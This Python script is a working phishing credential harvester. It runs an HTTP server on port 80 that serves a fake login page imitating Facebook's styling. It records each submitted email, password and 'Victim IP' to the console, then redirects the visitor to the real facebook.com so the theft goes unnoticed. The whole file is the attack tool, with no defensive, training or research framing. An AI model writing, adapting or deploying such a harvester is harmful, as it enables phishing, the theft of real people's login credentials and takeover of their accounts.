#!/usr/bin/env python3
"""
Credential Harvester Server
Listens on port 80, serves a fake login page, and captures POST credentials.
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse
import sys

PORT = 80  # Change to 8080 if port 80 is in use

class CredentialHandler(BaseHTTPRequestHandler):
    """Handles GET and POST requests for credential harvesting."""

    def log_message(self, format, *args):
        """Silence default logging to keep output clean."""
        pass

    def do_GET(self):
        """Serve the fake login page."""
        try:
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
            
            html = '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Log In</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #f0f2f5; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { width: 400px; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        h2 { color: #1877f2; margin-bottom: 20px; }
        input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #ddd; border-radius: 6px; font-size: 16px; }
        button { width: 100%; background: #1877f2; color: white; padding: 14px; border: none; border-radius: 6px; font-size: 18px; cursor: pointer; }
        button:hover { background: #166fe5; }
        .footer { margin-top: 20px; text-align: center; color: #777; }
        a { color: #1877f2; text-decoration: none; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Log In</h2>
        <form action="/" method="POST">
            <input type="text" name="email" placeholder="Email or phone number" required>
            <input type="password" name="pass" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
        <div class="footer"><a href="#">Forgot password?</a></div>
    </div>
</body>
</html>'''
            self.wfile.write(html.encode('utf-8'))
            
        except Exception as e:
            print(f"[!] Error serving page: {e}")

    def do_POST(self):
        """Handle POST requests and capture credentials."""
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            if content_length == 0:
                self.send_response(400)
                self.end_headers()
                return
                
            post_data = self.rfile.read(content_length)
            data = urllib.parse.parse_qs(post_data.decode('utf-8', errors='ignore'))
            
            email = data.get('email', [''])[0]
            password = data.get('pass', [''])[0]
            
            print("\n" + "="*60)
            print("[+] CREDENTIALS CAPTURED!")
            print(f"[+] Victim IP: {self.client_address[0]}")
            print(f"[+] Email/Username: {email}")
            print(f"[+] Password:        {password}")
            print("="*60 + "\n")
            
            # Redirect to real Facebook
            self.send_response(302)
            self.send_header('Location', 'https://www.facebook.com')
            self.end_headers()
            
        except Exception as e:
            print(f"[!] Error processing POST: {e}")
            self.send_response(500)
            self.end_headers()

    def do_HEAD(self):
        """Handle HEAD requests."""
        self.send_response(200)
        self.end_headers()


def run_server():
    """Start the HTTP server."""
    try:
        server = HTTPServer(('0.0.0.0', PORT), CredentialHandler)
        print(f"[+] Server running on port {PORT}")
        print(f"[+] Waiting for victims at http://<your-ip>:{PORT}")
        print("[+] Press Ctrl+C to stop.\n")
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[!] Server stopped by user.")
        sys.exit(0)
    except PermissionError:
        print(f"[!] Permission denied. Try: sudo python3 {sys.argv[0]}")
        sys.exit(1)
    except OSError as e:
        if "Address already in use" in str(e):
            print(f"[!] Port {PORT} is already in use.")
            print(f"[!] Change PORT in the script to 8080 or stop the other service.")
        else:
            print(f"[!] Error: {e}")
        sys.exit(1)


if __name__ == '__main__':
    run_server()